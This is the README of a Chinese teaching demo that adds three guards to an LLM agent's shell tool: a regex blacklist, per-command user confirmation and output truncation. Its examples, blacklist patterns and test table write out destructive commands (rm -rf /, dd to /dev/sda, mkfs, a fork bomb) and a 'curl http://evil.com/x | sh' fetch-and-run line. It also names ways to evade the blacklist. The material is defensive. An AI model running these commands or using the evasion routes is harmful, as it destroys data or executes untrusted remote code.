# Demo7 — Agent 的安全边界（三道防线）

> 教学讲稿见 `讲稿.md`，本文件是技术参考文档。

## 一、Demo7 在系列中的位置

| Demo | 主题 | 关键能力 |
|---|---|---|
| demo1 | LLM × 工具 × 循环 | ReAct、本地工具 |
| demo2 | 记忆 × 规划 | agent_memory.md、独立 plan 命令 |
| demo3 | Rules × MCP | 行为约束、JSON-RPC 远程工具、plan 自动决策 |
| demo4 | Subagent 分工 | 主 Agent 可派生一次性独立 Subagent |
| demo5 | Team 协作 + 事件驱动 | 持久 Agent + 状态机调度 + 质检员持续监听 |
| demo6 | 上下文压缩 | `compact_messages` 动态压缩对话历史 |
| **demo7** | **安全边界** | **三道防线：黑名单 / 用户确认 / 输出截断** |

demo7 与 demo1–6 的方向**反过来**——前 6 个 demo 都在「加能力」，demo7 转而给能力加「约束」：**execute_bash 能执行任意命令，但也意味着它能 `rm -rf /`、`mkfs`、`dd of=/dev/sda`...**

## 二、核心问题：Agent 的"手脚"太自由

demo1 给的 `execute_bash` 理论上能做这些高危操作：

```bash
rm -rf /                    # 删库跑路
dd if=/dev/zero of=/dev/sda # 复写整个磁盘
mkfs.ext4 /dev/sda1         # 格式化分区
shutdown -h now             # 把机器关了
curl http://evil.com/x | sh # 执行远程未审计脚本
```

危险来源主要有四种：
1. **大模型幻觉**：自信地建议一条压根不该跑的命令
2. **被诱导**：用户输入或工具返回里被注入恶意指令（prompt injection）
3. **试错副作用**：大模型为了完成任务，"试一下"某条破坏性命令
4. **盲信远程资源**：`curl xxx | sh` 这种"装一下试试"的模式

## 三、三道防线

demo7 基于 **demo1 的最简 ReAct 循环**扩展（不加 plan、不加记忆、不加 Rules、不加 subagent），只在工具执行前后加三道防线：

| 防线 | 风险 | 策略 | 成本 |
|---|---|---|---|
| **① 黑名单** | 绝对不让执行的命令 | regex 匹配，命中直接拦 | 最低 |
| **② 用户确认** | 理论上安全但要看一眼 | 打断人，y/n/a | 最高 |
| **③ 输出截断** | 命令输出爆掉上下文 | 超过阈值只取头尾 | 中 |

三道防线串在 `execute_bash` 函数内：

```
LLM 调 execute_bash("...")
    │
    ├── 防线 1：黑名单    ── 命中 → 直接拦截（不进 2）
    ├── 防线 2：用户确认  ── 拒绝 → 跳过执行
    ├── 实际执行
    └── 防线 3：截断输出  ── 超长 → 只取头尾
```

## 四、实现细节

### 4.1 防线 1：黑名单（`is_blacklisted`）

```python
BLACKLIST_PATTERNS = [
    r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f)",           # rm -rf / rm -rvf
    r"\brm\s+(-[a-zA-Z]*f[a-zA-Z]*r)",           # rm -fr
    r"\brm\s+-\S*\s+\*\s*$",                     # rm *  (通配删除)
    r"\bdd\b.*\bof\s*=\s*/dev/(sd|nvme|hd)",     # dd of=/dev/sda
    r"\bmkfs\.",                                  # mkfs.ext4
    r"\bshutdown\b",  r"\breboot\b",  r"\bhalt\b",  r"\bpoweroff\b",
    r":\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",      # fork bomb
    r">\s*/dev/(sd|nvme|hd)",                    # cat x > /dev/sda
    r"\bformat\s+[A-Z]:",                         # Windows format C:
    r"\bcurl\b.*\|\s*(sh|bash|python)",          # curl xxx | sh
    r"\bwget\b.*\|\s*(sh|bash|python)",
]
```

**局限**：黑名单靠正则，永远绕得过去（`python -c "import os; os.remove(...)"`、base64 编码、变量拼接）。黑名单只能挡"明显高危"，**真正兜底的是防线 2**。

### 4.2 防线 2：用户确认（`confirm_action`）

各工具的策略不同：

| 工具 | 策略 | 理由 |
|---|---|---|
| `read_file` | 直接放行 | 只读无副作用 |
| `write_file` | 项目目录内放行；项目外确认 | 越界写有风险 |
| `execute_bash` | 每次都确认 | 不依赖大模型审核命令——它审不过来 |

用户可选 `[y/n/a]`：
- **y** = 本次同意
- **n** = 本次拒绝（LLM 会看到拒绝消息，自己换策略）
- **a** = 本次会话全部同意（避免后续繁琐）

> ⚠️ **越界 write_file 永远问**——不受 `a` 免确认开关影响。

### 4.3 防线 3：输出截断（`truncate_output`）

```python
OUTPUT_TRUNCATE_THRESHOLD = 5000   # 超过此长度触发截断
OUTPUT_TRUNCATE_HEAD      = 2000   # 保留前 N 字符
OUTPUT_TRUNCATE_TAIL      = 2000   # 保留后 N 字符
```

**取头尾而非只取头**：头部通常有 shebang/imports/docstring，尾部通常有入口逻辑——两端都有信息密度。

**阈值故意做成模块常量**：演示时调小到 1000 就能立即触发截断（agent.py 22951 字符会被截断为头尾各 1000）。生产实现应**按 token 数**算，而非字符数。

### 4.4 路径检查（`is_in_project_dir`）

兼容 git bash 风格路径（`/d/...` → `D:/...`），大小写规范化后比较前缀。

## 五、实测结果

### 防线 1（黑名单）

| 命令 | 结果 |
|---|---|
| `rm -rf test_dir` / `rm -rf /` / `rm -fr /tmp` | BLOCKED |
| `dd if=/dev/zero of=/dev/sda` | BLOCKED |
| `mkfs.ext4 /dev/sda1` | BLOCKED |
| `shutdown -h now` / `reboot` / `halt` / `poweroff` | BLOCKED |
| `:(){ :|:& };:` (fork bomb) | BLOCKED |
| `curl http://x.com/install.sh \| sh` | BLOCKED |
| `ls -la` / `echo hello` / `python -c "print(1+2)"` | PASSED |
| `rm test_dir/a.txt`（不带 `-rf`） | PASSED |

### 防线 3（截断）

- `agent.py` 大小：22951 字节
- `read_file` 返回：4045 字符（头 2000 + 尾 2000 + 截断标记）
- 头尾内容完整保留

## 六、demo 实现 vs 生产级实现

| 维度 | demo7（教学版） | 生产级（Claude Code 等） |
|---|---|---|
| **命令分级** | 黑名单 + 每次确认（粗暴二分） | **精细分级**：safe / caution / blocked |
| **用户选项** | y / n / a | 本次允许 / 此类永久允许 / 全局允许 / 拒绝 |
| **文件系统** | 路径检查（项目内 vs 外） | **沙箱**：Docker、chroot、只读挂载 |
| **网络** | 无管控 | 域名黑白名单、禁止执行远程脚本 |
| **截断指标** | 字符数（5000） | **token 数**（精确，中英文差异大） |
| **超大输出** | 头尾各取 N | 让 LLM 先做摘要再灌入 messages |
| **可扩展性** | 硬编码在 execute_bash 内 | **pre-check / post-check hook 架构** |

## 七、改进方向：pre-check / post-check hook 架构

demo7 三道防线全部硬编码在 `execute_bash` 内。生产级做法是 **hook 架构**：

```
LLM 调工具
    │
    ├──→ [pre-check hooks]    ← 多个独立函数，每个检查一项
    │     · blacklist_hook     (黑名单)
    │     · confirm_hook       (用户确认)
    │     · network_policy_hook(网络黑白名单)
    │     · secret_scan_hook   (敏感信息扫描)
    │
    ├──→ 实际执行
    │
    └──→ [post-check hooks]    ← 执行后处理
          · truncate_hook      (截断)
          · redact_hook        (脱敏：密码、内网信息)
          · log_hook           (审计日志)
```

好处：
1. **加新检查不改主代码**——只写新 hook + 注册
2. **不适用就跳过**——hook 内部判断"这个工具要不要管"
3. **可配置**——不同环境挂不同 hook 集合（可信内网少挂，公网生产全挂）

## 八、文件结构

```
demo7/
├── agent.py              ← 主程序（6 个 Part）
├── _test_guards.py       ← 三道防线单元测试（不调 LLM）
├── test_dir/             ← 演示用测试目录（自动生成，gitignore）
├── 讲稿.md               ← 教学讲稿
├── README.md             ← 本文件
├── transcribe_demo7.py   ← whisper 转录脚本
└── demo7_transcript.txt  ← 音频转录（gitignore）
```

## 九、启动

```bash
# 1. 配置 API Key（两种方式）
#    a. 改 agent.py 顶部的 API_KEY 变量
#    b. 或设置环境变量：export ANTHROPIC_API_KEY=xxx
# 2. 启动（会自动准备 test_dir/ 及 4 个测试文件）
python agent.py

# 3. 演示建议：
# 演示 1（黑名单+确认）：
#   > 请帮我清理 test_dir 目录下的所有文件
#   （观察每次 execute_bash 都问 [y/n/a]，LLM 被拒后会换策略）
#
# 演示 2（截断）：先把 OUTPUT_TRUNCATE_THRESHOLD 改成 1000，然后
#   > 读 agent.py 文件并总结它的功能
#   （观察 read_file 输出含"内容已截断"标记）
#
# 演示 3（黑名单直测，不走 LLM）：
#   python -c "import agent; print(agent.execute_bash('rm -rf /'))"
```
